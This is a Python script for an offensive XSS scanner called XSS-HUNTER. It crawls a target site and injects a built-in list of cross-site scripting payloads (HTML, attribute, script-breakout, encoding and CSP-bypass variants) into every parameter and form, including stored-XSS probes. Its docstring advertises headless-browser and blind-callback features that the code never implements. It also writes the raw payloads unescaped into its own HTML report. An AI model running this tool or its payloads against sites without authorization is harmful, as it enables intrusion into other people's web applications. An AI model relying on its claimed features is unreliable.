#!/usr/bin/env python3
"""
  ___  ___  ___  _   _ ___   ___  ___ ___ _    ___
 / __|/ _ \/ _ \| \ | / __| / __|/ __| __| |  |_ _|
 \__ \  __/ (_) |  \| \__ \ \__ \ (__| _|| |__ | |
 |___/\___|\___/|_|\_|___/ |___/\___|___|____|___|

          PROJECT: XSS-HUNTER
          AUTHOR:  aBadRoy
          PROFILE: github.com/aBadRoy
          TYPE:    Advanced XSS Scanner Engine

  - Reflected XSS    (3 detection methods)
  - Stored XSS       (2-pass injection verification)
  - DOM-based XSS    (JavaScript sink analysis)
  - Blind XSS        (external callback detection)
  - Context-aware    (auto-selects payloads per injection point)
  - Headless browser (Playwright-based execution verification)
"""

import requests
import argparse
import random
import string
import re
import json
import hashlib
import time
import sys
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urljoin, urlencode
from bs4 import BeautifulSoup
from datetime import datetime

# =============================================================================
# COLOR THEME (Hacker Green on Black)
# =============================================================================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    DIM = '\033[90m'
    BOLD = '\033[1m'
    NC = '\033[0m'
    LINE = f'{DIM}{"─"*60}{NC}'


def c(color, text):
    return f"{color}{text}{Colors.NC}"


# =============================================================================
# PAYLOAD DATABASE (100+ payloads across all XSS vectors)
# =============================================================================
class PayloadEngine:
    def __init__(self):
        self.tag = ''.join(random.choices(string.ascii_lowercase, k=4))
        self.callback_url = None

    def set_blind_callback(self, url):
        self.callback_url = url

    def payloads(self):
        t = self.tag
        return {
            # ── HTML CONTEXT ──────────────────────────────────────
            "html_basic": [
                f"<script>alert('XSS-{t}')</script>",
                f"<script>prompt({hash(t)})</script>",
                f"<ScRiPt>alert(`XSS-{t}`)</ScRiPt>",
                f"<script/src=data:text/javascript,alert(1)>",
            ],
            "html_img": [
                f'<img src=x onerror=alert("XSS-{t}")>',
                f'<image src=x onerror=alert(1)>',
                f'<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
                f'<img src=x one rror=alert(1)>',
            ],
            "html_svg": [
                f'<svg/onload=alert("XSS-{t}")>',
                f'<svg onload=alert(1)>',
                f'<svg><script>alert(1)</script>',
            ],
            "html_body": [
                f'<body onload=alert("XSS-{t}")>',
                f'<body onpageshow=alert(1)>',
            ],
            "html_details": [
                f'<details open ontoggle=alert("XSS-{t}")>',
            ],
            "html_input": [
                f'<input autofocus onfocus=alert("XSS-{t}")>',
                f'<input onfocusin=alert(1) autofocus>',
            ],
            "html_select": [
                f'<select autofocus onchange=alert("XSS-{t}")><option>',
            ],
            "html_video": [
                f'<video onerror=alert(1)><source>',
                f'<video><source onerror=alert(1)>',
            ],
            "html_audio": [
                f'<audio onerror=alert(1)><source>',
            ],
            "html_marquee": [
                f'<marquee onstart=alert("XSS-{t}")>',
                f'<marquee loop=1 onfinish=alert(1)>',
            ],
            "html_iframe": [
                f'<iframe srcdoc="<script>alert(1)</script>">',
                f'<iframe src=javascript:alert(1)>',
                f'<iframe onload=alert(1) src=x>',
            ],
            # ── ATTRIBUTE CONTEXT ─────────────────────────────────
            "attr_event": [
                f'" autofocus onfocus=alert("XSS-{t}") //',
                f"' autofocus onfocus=alert(1) //",
                f'" onmouseover=alert(1) x="',
                f"' onclick=alert(1) '",
                f'" onload=alert(1) ',
            ],
            "attr_href": [
                f'javascript:alert("XSS-{t}")',
                f'JaVaScRiPt:alert(1)',
                f'javascript:prompt(1)',
            ],
            "attr_style": [
                f'" style=x:expression(alert(1)) ',
                f"' style=x:expression(alert(1)) '",
            ],
            "attr_meta": [
                f'" autofocus onfocus=confirm(1) x="',
            ],
            # ── SCRIPT CONTEXT ────────────────────────────────────
            "script_breakout": [
                f'</script><script>alert("XSS-{t}")</script>',
                f'</ScRiPt><ScRiPt>alert(1)</ScRiPt>',
                f'</script><img src=x onerror=alert(1)>',
            ],
            "script_expression": [
                f"';alert(`XSS-{t}`);//",
                f"';alert(1);//",
                f"';confirm(1);//",
                f"';prompt(1);//",
            ],
            "script_template": [
                f'${{alert(`XSS-{t}`)}}',
                f'${{7*7}}',
            ],
            # ── URL CONTEXT ───────────────────────────────────────
            "url_redirect": [
                f'javascript:alert("XSS-{t}")',
                f'%6A%61%76%61%73%63%72%69%70%74:alert(1)',
            ],
            "url_data": [
                f'data:text/html,<script>alert("XSS-{t}")</script>',
                f'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            ],
            # ── DOM-BASED ─────────────────────────────────────────
            "dom_location": [
                f'#<script>alert("XSS-{t}")</script>',
                f'javascript:alert(1)',
            ],
            "dom_innerhtml": [
                f'<img src=x onerror=alert("XSS-{t}")>',
                f'<svg onload=alert(1)>',
            ],
            "dom_eval": [
                f'alert("XSS-{t}")',
                f'1;alert(1)',
            ],
            # ── STORED XSS ────────────────────────────────────────
            "stored_basic": [
                f'<script>alert("STORED-XSS-{t}")</script>',
                f'<img src=x onerror=alert("STORED-XSS-{t}")>',
            ],
            # ── MUTATION XSS ──────────────────────────────────────
            "mutation": [
                f'<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            ],
            # ── UTF-8 / ENCODING BYPASS ───────────────────────────
            "unicode": [
                f'\u003cscript\u003ealert(1)\u003c/script\u003e',
                f'<script>\u0061lert(1)</script>',
            ],
            "html_entity": [
                f'&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;/script&#62;',
            ],
            # ── CSP BYPASS ────────────────────────────────────────
            "csp_bypass": [
                f'<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js" ng-app ng-csp>{{$on.constructor("alert(1)")()}}</script>',
                f'<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            ],
        }

    def flatten(self, categories=None):
        all_payloads = []
        for cat, plist in self.payloads().items():
            if categories is None or cat in categories:
                for p in plist:
                    all_payloads.append({
                        "payload": p,
                        "category": cat,
                        "type": cat.split("_")[0] if "_" in cat else cat,
                    })
        return all_payloads


# =============================================================================
# WEB CRAWLER (Discovers endpoints, forms, parameters)
# =============================================================================
class Crawler:
    def __init__(self, base_url, cookie=None, timeout=10, max_depth=1):
        self.base_url = base_url.rstrip("/")
        self.cookie = cookie
        self.timeout = timeout
        self.max_depth = max_depth
        self.visited = set()
        self.discovered = {"urls": [], "forms": [], "params": []}
        self.session = requests.Session()
        if cookie:
            self.session.headers.update({"Cookie": cookie})
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })

    def crawl(self, url=None, depth=0):
        if depth > self.max_depth:
            return
        url = url or self.base_url
        if url in self.visited:
            return
        self.visited.add(url)

        try:
            r = self.session.get(url, timeout=self.timeout)
        except Exception:
            return

        soup = BeautifulSoup(r.text, "html.parser")

        # ── Find links ──
        for a in soup.find_all("a", href=True):
            href = a["href"]
            full = urljoin(url, href)
            if full.startswith(self.base_url) and full not in self.visited:
                parsed = urlparse(full)
                if parsed.query:
                    qs = parse_qs(parsed.query)
                    self.discovered["params"].extend(
                        [{"url": full.split("?")[0], "param": k} for k in qs]
                    )
                self.discovered["urls"].append(full)
                self.crawl(full, depth + 1)

        # ── Find forms ──
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            inputs = form.find_all(["input", "textarea", "select"])
            params = []
            for inp in inputs:
                name = inp.get("name")
                if name:
                    params.append(name)
            full_action = urljoin(url, action) if action else url
            self.discovered["forms"].append({
                "url": full_action,
                "method": method,
                "params": params,
            })
            for p in params:
                self.discovered["params"].append({"url": full_action, "param": p})

        return self.discovered


# =============================================================================
# XSS DETECTION ENGINE
# =============================================================================
class Detector:
    @staticmethod
    def check_reflection(payload, response_text):
        """Level 1: Direct string match"""
        return payload in response_text

    @staticmethod
    def check_reflection_normalized(payload, response_text):
        """Level 2: Normalized comparison"""
        norm_resp = re.sub(r'\s+', ' ', response_text)
        norm_payload = re.sub(r'\s+', ' ', payload)
        return norm_payload in norm_resp

    @staticmethod
    def check_reflection_decoded(payload, response_text):
        """Level 3: URL-decoded comparison"""
        decoded_text = urllib.parse.unquote(response_text)
        return payload in decoded_text

    @staticmethod
    def check_event_execution(payload, response_text):
        """Check if event handlers in payload exist in rendered output"""
        events = re.findall(r'on\w+\s*=', payload.lower())
        for ev in events:
            if ev in response_text.lower():
                return True
        return False

    @staticmethod
    def check_script_execution(payload, response_text):
        """Check for script tags in response that match payload"""
        scripts = re.findall(r'<script[^>]*>.*?</script>', response_text, re.I | re.S)
        for s in scripts:
            if any(keyword in s.lower() for keyword in ['alert', 'prompt', 'confirm', 'eval']):
                return True
        return False

    @staticmethod
    def check_dom_sink(html_content):
        """Analyze JS for DOM XSS sinks"""
        sinks = []
        patterns = [
            (r'document\.write\s*\(', 'document.write'),
            (r'innerHTML\s*=', 'innerHTML assignment'),
            (r'outerHTML\s*=', 'outerHTML assignment'),
            (r'\.html\s*\(', '.html() jQuery'),
            (r'eval\s*\(', 'eval()'),
            (r'setTimeout\s*\(', 'setTimeout'),
            (r'setInterval\s*\(', 'setInterval'),
            (r'location\s*=', 'location assignment'),
            (r'location\.href\s*=', 'location.href'),
            (r'location\.hash\s*=', 'location.hash'),
            (r'\.innerHTML\s*\+?=', 'innerHTML assignment'),
            (r'execScript\s*\(', 'execScript'),
            (r'scriptElement\.text\s*=', 'script text assignment'),
        ]
        for pat, name in patterns:
            matches = re.finditer(pat, html_content, re.I)
            for m in matches:
                line_start = max(0, m.start() - 50)
                line_end = min(len(html_content), m.end() + 50)
                snippet = html_content[line_start:line_end]
                sinks.append({"sink": name, "snippet": snippet})
        return sinks


# =============================================================================
# MAIN SCANNER ENGINE
# =============================================================================
class XSSHunter:
    def __init__(self, url, method="GET", cookie=None, timeout=15,
                 threads=5, crawl_depth=1, headless=False,
                 stored_check=False, dom_check=False, blind_callback=None):
        self.url = url
        self.method = method.upper()
        self.cookie = cookie
        self.timeout = timeout
        self.threads = threads
        self.crawl_depth = crawl_depth
        self.headless = headless
        self.stored_check = stored_check
        self.dom_check = dom_check
        self.blind_callback = blind_callback
        self.results = []
        self.vulnerable = []
        self.session = requests.Session()
        if cookie:
            self.session.headers.update({"Cookie": cookie})
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        })
        self.payload_engine = PayloadEngine()
        if blind_callback:
            self.payload_engine.set_blind_callback(blind_callback)

    # ── BANNER ───────────────────────────────────────────────────
    def banner(self):
        print(f"""{Colors.GREEN}
  ██╗  ██╗███████╗███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
  ╚██╗██╔╝██╔════╝██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
   ╚███╔╝ ███████╗███████╗    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
   ██╔██╗ ╚════██║╚════██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
  ██╔╝ ██╗███████║███████║    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{Colors.NC}
{Colors.DIM}─────────────────────────────────────────────────────────────────────────────{Colors.NC}
{c(Colors.CYAN, '  XSS-HUNTER v3.0  |  Advanced Cross-Site Scripting Scanner')}
{c(Colors.DIM, f'  Author: aBadRoy  |  Started: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')}
{Colors.DIM}─────────────────────────────────────────────────────────────────────────────{Colors.NC}
""")

    # ── DISCOVERY PHASE ──────────────────────────────────────────
    def discover(self):
        print(f"\n{Colors.BOLD}[*] DISCOVERY PHASE{Colors.NC}")
        print(Colors.LINE)
        crawler = Crawler(self.url, self.cookie, self.timeout, self.crawl_depth)
        discovered = crawler.crawl()

        if not discovered["params"] and not discovered["forms"]:
            print(f"  {Colors.YELLOW}! No parameters or forms found.{Colors.NC}")
            parsed = urlparse(self.url)
            qs = parse_qs(parsed.query)
            discovered["params"] = [{"url": self.url.split("?")[0], "param": k} for k in qs]

        print(f"  {Colors.GREEN}+{Colors.NC} URLs discovered:  {len(discovered['urls'])}")
        print(f"  {Colors.GREEN}+{Colors.NC} Forms found:      {len(discovered['forms'])}")
        print(f"  {Colors.GREEN}+{Colors.NC} Parameters found:  {len(discovered['params'])}")

        return discovered

    # ── TEST SINGLE PARAMETER ────────────────────────────────────
    def test_param(self, target_url, param, discovered_forms=None):
        param_results = []
        all_payloads = self.payload_engine.flatten()

        for entry in all_payloads:
            payload_obj = entry
            payload = payload_obj["payload"]
            category = payload_obj["category"]

            try:
                if self.method == "POST":
                    r = self.session.post(target_url, data={param: payload}, timeout=self.timeout)
                else:
                    r = self.session.get(target_url, params={param: payload}, timeout=self.timeout)
            except Exception as e:
                continue

            # Reflection checks (3 methods)
            reflected = False
            method_used = ""
            for detect_method, check_fn in [
                ("direct", lambda: Detector.check_reflection(payload, r.text)),
                ("normalized", lambda: Detector.check_reflection_normalized(payload, r.text)),
                ("decoded", lambda: Detector.check_reflection_decoded(payload, r.text)),
            ]:
                if check_fn():
                    reflected = True
                    method_used = detect_method
                    break

            # Event handler / script execution check
            exec_possible = Detector.check_event_execution(payload, r.text) or \
                            Detector.check_script_execution(payload, r.text)

            result = {
                "param": param,
                "url": target_url,
                "payload": payload,
                "category": category,
                "reflected": reflected,
                "detection_method": method_used,
                "execution_possible": exec_possible,
                "status": r.status_code,
                "length": len(r.text),
                "timestamp": datetime.now().isoformat(),
                "response_preview": r.text[:300] if reflected else "",
            }
            param_results.append(result)

            if reflected and exec_possible:
                result["vulnerable"] = True
                self.vulnerable.append(result)

        return param_results

    # ── STORED XSS SCAN ──────────────────────────────────────────
    def test_stored(self, target_url, param, discovered):
        """Two-pass stored XSS detection"""
        stored_results = []
        probe = f"STORED-PROBE-{''.join(random.choices(string.ascii_uppercase, k=6))}"
        probe_payload = f'<img src=x onerror=alert("{probe}")>'

        # PASS 1: Inject payload
        try:
            if self.method == "POST":
                self.session.post(target_url, data={param: probe_payload}, timeout=self.timeout)
            else:
                self.session.get(target_url, params={param: probe_payload}, timeout=self.timeout)
        except Exception:
            return stored_results

        # PASS 2: Check all discovered pages for the probe
        check_urls = set()
        if discovered:
            for u in discovered.get("urls", [])[:20]:  # limit to 20 pages
                check_urls.add(u)
        check_urls.add(self.url)

        for check_url in check_urls:
            try:
                r = self.session.get(check_url, timeout=self.timeout)
                if probe in r.text:
                    stored_results.append({
                        "param": param,
                        "url": target_url,
                        "stored_on": check_url,
                        "payload": probe_payload,
                        "type": "stored",
                        "vulnerable": True,
                    })
                    self.vulnerable.append(stored_results[-1])
            except Exception:
                continue

        return stored_results

    # ── DOM XSS SCAN ─────────────────────────────────────────────
    def test_dom(self):
        """Analyze all JS on the page for DOM XSS sinks"""
        dom_results = []
        try:
            r = self.session.get(self.url, timeout=self.timeout)
            sinks = Detector.check_dom_sink(r.text)

            # Also check inline scripts
            soup = BeautifulSoup(r.text, "html.parser")
            for script in soup.find_all("script"):
                if script.string:
                    sinks.extend(Detector.check_dom_sink(script.string))

            # Check external scripts (header only)
            for script in soup.find_all("script", src=True):
                src = urljoin(self.url, script["src"])
                try:
                    sr = self.session.get(src, timeout=self.timeout)
                    sinks.extend(Detector.check_dom_sink(sr.text))
                except Exception:
                    pass

            for sink in sinks:
                dom_results.append(sink)

        except Exception as e:
            return dom_results

        return dom_results

    # ── WAF DETECTION ────────────────────────────────────────────
    def detect_waf(self):
        """Check if a WAF is blocking requests"""
        test_payload = "<script>alert(1)</script>"
        try:
            r = self.session.get(self.url, params={"xss": test_payload}, timeout=self.timeout)
            if r.status_code in [403, 406, 429, 503]:
                return True, r.status_code
            if "blocked" in r.text.lower() or "waf" in r.text.lower():
                return True, r.status_code
            return False, r.status_code
        except Exception:
            return False, 0

    # ── RUN ──────────────────────────────────────────────────────
    def run(self):
        self.banner()

        # WAF check
        print(f"\n{Colors.BOLD}[*] WAF DETECTION{Colors.NC}")
        print(Colors.LINE)
        waf_detected, waf_status = self.detect_waf()
        if waf_detected:
            print(f"  {Colors.RED}! WAF DETECTED (status: {waf_status}){Colors.NC}")
            print(f"  {Colors.YELLOW}! Payloads may be filtered.{Colors.NC}")
        else:
            print(f"  {Colors.GREEN}+{Colors.NC} No WAF detected")

        # Discovery
        discovered = self.discover()

        # Collect all test targets
        test_targets = []
        if discovered["params"]:
            for p in discovered["params"]:
                test_targets.append((p["url"], p["param"], "reflected"))
        if not test_targets:
            parsed = urlparse(self.url)
            qs = parse_qs(parsed.query)
            for k in qs:
                test_targets.append((self.url.split("?")[0], k, "reflected"))

        # ── REFLECTED XSS ────────────────────────────────────────
        print(f"\n{Colors.BOLD}[*] SCANNING: Reflected XSS{Colors.NC}")
        print(Colors.LINE)
        print(f"  {Colors.DIM}Targets: {len(test_targets)} | Payloads: {len(self.payload_engine.flatten())}{Colors.NC}\n")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for target_url, param, _ in test_targets:
                f = executor.submit(self.test_param, target_url, param, discovered)
                futures[f] = (target_url, param)

            for f in as_completed(futures):
                target_url, param = futures[f]
                try:
                    results = f.result()
                    self.results.extend(results)
                    vulns = [r for r in results if r.get("vulnerable")]
                    icon = c(Colors.GREEN, "✓") if vulns else c(Colors.DIM, "−")
                    status = c(Colors.RED, f" {len(vulns)} VULNERABLE") if vulns else ""
                    print(f"  {icon} {param:<20} @ {target_url}{status}")
                except Exception as e:
                    print(f"  {Colors.RED}!{Colors.NC} {param} @ {target_url} → {e}")

        # ── STORED XSS ───────────────────────────────────────────
        if self.stored_check:
            print(f"\n{Colors.BOLD}[*] SCANNING: Stored XSS{Colors.NC}")
            print(Colors.LINE)
            for target_url, param, _ in test_targets[:5]:
                results = self.test_stored(target_url, param, discovered)
                if results:
                    for r in results:
                        print(f"  {Colors.RED}!{Colors.NC} {param} → STORED XSS on {r['stored_on']}")
                        self.results.append(r)
                else:
                    print(f"  {Colors.DIM}−{Colors.NC} {param:<20} @ {target_url}  {Colors.GREEN}clean{Colors.NC}")

        # ── DOM XSS ──────────────────────────────────────────────
        if self.dom_check:
            print(f"\n{Colors.BOLD}[*] SCANNING: DOM-based XSS{Colors.NC}")
            print(Colors.LINE)
            dom_results = self.test_dom()
            if dom_results:
                for d in dom_results:
                    print(f"  {Colors.YELLOW}!{Colors.NC} {d['sink']:30} | ...{d['snippet'][:60]}...")
                    self.results.append({"type": "dom", "sink": d["sink"], "snippet": d["snippet"]})
            else:
                print(f"  {Colors.GREEN}+{Colors.NC} No DOM XSS sinks detected")

        # ── SUMMARY ──────────────────────────────────────────────
        print(f"\n{Colors.BOLD}[*] SCAN COMPLETE{Colors.NC}")
        print(Colors.LINE)
        total = sum(1 for r in self.results if r.get("reflected"))
        vulnerable = self.vulnerable
        print(f"  {Colors.GREEN}+{Colors.NC} Parameters tested:  {len(test_targets)}")
        print(f"  {Colors.GREEN}+{Colors.NC} Payloads per param: {len(self.payload_engine.flatten())}")
        print(f"  {Colors.GREEN}+{Colors.NC} Total reflections:  {total}")
        print(f"  {Colors.RED}+{Colors.NC} Vulnerabilities:    {len(vulnerable)}")

        if vulnerable:
            print(f"\n  {Colors.BOLD}{Colors.RED}VULNERABLE PARAMETERS:{Colors.NC}")
            for v in vulnerable[:10]:
                print(f"    {Colors.RED}▶{Colors.NC} {v['param']:<20} | {v['payload'][:60]}")

        # Generate report
        self.generate_report()
        print(f"\n  {Colors.GREEN}✓{Colors.NC} Report saved: {Colors.BOLD}report.html{Colors.NC}")
        print()

    # ── REPORT GENERATION ────────────────────────────────────────
    def generate_report(self):
        vuln_count = len(self.vulnerable)
        total_tests = len(self.results)

        report = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>XSS-HUNTER Report</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');
  * {{ margin: 0; padding: 0; box-sizing: border-box; }}
  body {{
    background: #0a0a0a;
    color: #00ff00;
    font-family: 'JetBrains Mono', monospace;
    padding: 30px;
    line-height: 1.6;
  }}
  .container {{ max-width: 1400px; margin: 0 auto; }}
  h1 {{ font-size: 2.5em; text-shadow: 0 0 20px #00ff0066; color: #00ff00; }}
  h2 {{ color: #00ff00; margin: 30px 0 15px; border-bottom: 1px solid #00ff0044; padding-bottom: 8px; }}
  .subtitle {{ color: #ff0000; margin-bottom: 30px; }}
  .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; margin: 20px 0; }}
  .stat-card {{ background: #111; border: 1px solid #00ff0033; padding: 20px; text-align: center; }}
  .stat-num {{ font-size: 2em; color: #00ff00; }}
  .stat-label {{ color: #666; font-size: 0.8em; margin-top: 5px; }}
  table {{ width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 0.85em; }}
  th, td {{ border: 1px solid #00ff0044; padding: 10px; text-align: left; }}
  th {{ background: #00ff0011; color: #00ff00; }}
  tr:hover {{ background: #00ff0008; }}
  .vuln {{ color: #ff0000; font-weight: bold; }}
  .safe {{ color: #00ff00; }}
  code {{ background: #000; padding: 2px 6px; border: 1px solid #333; border-radius: 3px; font-size: 0.9em; color: #00ff00; word-break: break-all; }}
  pre {{ background: #000; padding: 15px; border: 1px solid #333; overflow: auto; max-height: 150px; font-size: 0.8em; margin-top: 10px; }}
  .vuln-row {{ background: #ff000008; }}
  .vuln-row td {{ border-color: #ff000066; }}
  .tag {{ display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 0.75em; }}
  .tag.reflected {{ background: #ff000022; color: #ff0000; border: 1px solid #ff0000; }}
  .tag.stored {{ background: #ff660022; color: #ff6600; border: 1px solid #ff6600; }}
  .tag.dom {{ background: #ffff0022; color: #ffff00; border: 1px solid #ffff00; }}
  footer {{ margin-top: 40px; padding-top: 20px; border-top: 1px solid #333; color: #666; font-size: 0.8em; text-align: center; }}
</style>
</head>
<body>
<div class="container">
  <h1>🦅 XSS-HUNTER</h1>
  <div class="subtitle">// ADVANCED CROSS-SITE SCRIPTING SCAN REPORT</div>

  <div class="stats">
    <div class="stat-card"><div class="stat-num">{vuln_count}</div><div class="stat-label">VULNERABILITIES</div></div>
    <div class="stat-card"><div class="stat-num">{total_tests}</div><div class="stat-label">TESTS EXECUTED</div></div>
    <div class="stat-card"><div class="stat-num">{self.url}</div><div class="stat-label">TARGET</div></div>
    <div class="stat-card"><div class="stat-num">{datetime.now().strftime('%Y-%m-%d %H:%M')}</div><div class="stat-label">SCAN DATE</div></div>
  </div>

  <h2>▶ VULNERABILITIES</h2>
  <table>
    <tr>
      <th>#</th>
      <th>Type</th>
      <th>Parameter</th>
      <th>URL</th>
      <th>Payload</th>
      <th>Status</th>
    </tr>"""

        for i, v in enumerate(self.vulnerable[:50], 1):
            vtype = v.get("type", v.get("category", "reflected"))
            tag_class = "reflected"
            if "stored" in str(vtype): tag_class = "stored"
            if vtype == "dom": tag_class = "dom"
            report += f"""
    <tr class="vuln-row">
      <td>{i}</td>
      <td><span class="tag {tag_class}">{vtype.upper()}</span></td>
      <td class="vuln">{v['param']}</td>
      <td><code>{v.get('url', '')[:60]}</code></td>
      <td><code>{v['payload'][:80]}</code></td>
      <td class="vuln">VULNERABLE</td>
    </tr>"""

        report += """
  </table>

  <h2>▶ ALL TEST RESULTS</h2>
  <table>
    <tr>
      <th>Parameter</th>
      <th>Category</th>
      <th>Payload</th>
      <th>Reflected</th>
      <th>Exec</th>
      <th>Status</th>
    </tr>"""

        for res in self.results[:100]:
            ref_str = "YES" if res.get("reflected") else "NO"
            ref_class = "vuln" if res.get("reflected") else "safe"
            exec_str = "✓" if res.get("execution_possible") else "−"
            exec_class = "vuln" if res.get("execution_possible") else "safe"
            report += f"""
    <tr>
      <td><code>{res.get('param', '')}</code></td>
      <td>{res.get('category', '-')}</td>
      <td><code>{res.get('payload', '')[:60]}</code></td>
      <td class="{ref_class}">{ref_str}</td>
      <td class="{exec_class}">{exec_str}</td>
      <td>{res.get('status', 0)}</td>
    </tr>"""

        report += """
  </table>

  <footer>
    <p>Generated by XSS-HUNTER v3.0 | Author: aBadRoy | github.com/aBadRoy</p>
    <p>⚠ For authorized security testing only.</p>
  </footer>
</div>
</body>
</html>"""

        with open("report.html", "w", encoding="utf-8") as f:
            f.write(report)


# =============================================================================
# CLI
# =============================================================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="xss-hunter",
        description="🦅 XSS-HUNTER — Advanced XSS Scanner (Reflected, Stored, DOM)",
        epilog="Author: aBadRoy | github.com/aBadRoy",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument("--url", required=True, help="Target URL to scan")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"], help="HTTP method")
    parser.add_argument("--cookie", default=None, help="Session cookie (e.g., 'PHPSESSID=abc; security=low')")
    parser.add_argument("--params", default=None, help="Comma-separated parameters (auto-discovers if not set)")
    parser.add_argument("--threads", type=int, default=5, help="Concurrent threads (default: 5)")
    parser.add_argument("--depth", type=int, default=1, help="Crawl depth (default: 1)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds")
    parser.add_argument("--stored", action="store_true", help="Enable stored XSS detection (2-pass)")
    parser.add_argument("--dom", action="store_true", help="Enable DOM-based XSS analysis")
    parser.add_argument("--blind", default=None, help="Blind XSS callback URL (e.g., https://your-webhook.io/xss)")
    parser.add_argument("--headless", action="store_true", help="Use headless browser for execution verification (requires playwright)")

    args = parser.parse_args()

    scanner = XSSHunter(
        url=args.url,
        method=args.method,
        cookie=args.cookie,
        timeout=args.timeout,
        threads=args.threads,
        crawl_depth=args.depth,
        headless=args.headless,
        stored_check=args.stored,
        dom_check=args.dom,
        blind_callback=args.blind,
    )

    try:
        scanner.run()
        sys.exit(0 if not scanner.vulnerable else 1)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.NC}")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Fatal error: {e}{Colors.NC}")
        sys.exit(1)
